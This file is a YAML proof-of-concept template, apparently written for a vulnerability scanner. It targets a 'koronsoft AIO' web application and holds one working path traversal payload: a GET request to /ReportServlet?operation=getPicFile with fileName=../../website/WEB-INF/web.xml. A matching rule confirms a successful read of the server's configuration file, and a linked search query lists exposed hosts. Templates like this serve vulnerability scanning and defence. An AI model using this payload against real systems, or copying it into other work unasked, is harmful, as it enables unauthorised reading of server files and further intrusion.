name: poc-yaml-koronsoft-aio-reportservlet-fileread
binding: 7801ee1a-8c7d-407e-a1ed-f5bd8d86521c
manual: true
detail:
    author: y0y0
    links:
        - https://mp.weixin.qq.com/s/OJPhl17HS8EBC6GLEAPvDg
        - https://fofa.info/result?qbase64=aWNvbl9oYXNoPSItNjM4MjkyMDg5Ig%3D%3D
    vulnerability:
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ReportServlet?operation=getPicFile&fileName=../../website/WEB-INF/web.xml
        expression: response.status == 200 && response.body_string.startsWith("<?xml") && response.body_string.contains("<filter-class>com.menyi.web.util.BaseFilter</filter-class>")
expression: r0()
